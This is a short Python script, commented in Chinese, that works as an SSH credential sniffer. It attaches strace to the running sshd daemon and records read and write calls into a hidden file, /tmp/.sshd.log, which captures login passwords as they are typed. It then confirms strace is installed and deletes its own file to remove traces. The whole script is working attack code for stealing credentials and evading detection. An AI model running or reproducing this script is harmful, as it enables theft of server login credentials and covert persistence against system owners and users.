# coding=utf-8
from __future__ import print_function
import subprocess
import os,sys

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout

def check_strace():
    j = ml('strace -V')
    if 'strace -- version' in j:
        print('成功')
    else:
        print('失败')

def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除"+script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)

if __name__ == '__main__':
    os.system("""(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &)""")
    os.system("""(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 4096 2> /tmp/.sshd.log &)""")
    check_strace()
    delete_current_script()  # 删除当前执行脚本文件
